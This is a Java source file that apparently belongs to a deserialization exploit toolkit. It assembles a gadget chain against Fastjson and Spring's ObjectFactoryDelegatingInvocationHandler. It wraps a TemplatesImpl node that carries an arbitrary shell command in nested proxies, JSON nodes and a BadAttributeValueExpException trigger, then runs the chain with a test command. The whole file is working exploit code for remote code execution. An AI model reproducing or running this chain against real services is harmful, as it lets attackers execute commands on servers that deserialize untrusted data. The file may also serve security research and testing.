import common.Util;
import gadgets.*;
import org.springframework.beans.factory.ObjectFactory;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Fastjson4_ObjectFactoryDelegatingInvocationHandler {

    public Object getObject (String cmd) throws Exception {

        Object node1 = TemplatesImplNode.makeGadget(cmd);
        Map map = new HashMap();
        map.put("object",node1);
        Object node2 = JSONObjectNode.makeGadget(2,map);
        Proxy proxy1 = (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),
                new Class[]{ObjectFactory.class}, (InvocationHandler)node2);
        Object node3 = ObjectFactoryDelegatingInvocationHandlerNode.makeGadget(proxy1);
        Proxy proxy2 = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),
                new Class[]{Templates.class}, (InvocationHandler)node3);
        Object node4 = JsonArrayNode.makeGadget(2,proxy2);
        Object node5 = BadAttrValExeNode.makeGadget(node4);
        Object[] array = new Object[]{node1,node5};
        Object node6 = HashMapNode.makeGadget(array);
        return node6;
    }

    public static void main(String[] args) throws Exception {
        Object object = new Fastjson4_ObjectFactoryDelegatingInvocationHandler().getObject(Util.getDefaultTestCmd());
        Util.runGadgets(object);
    }
}
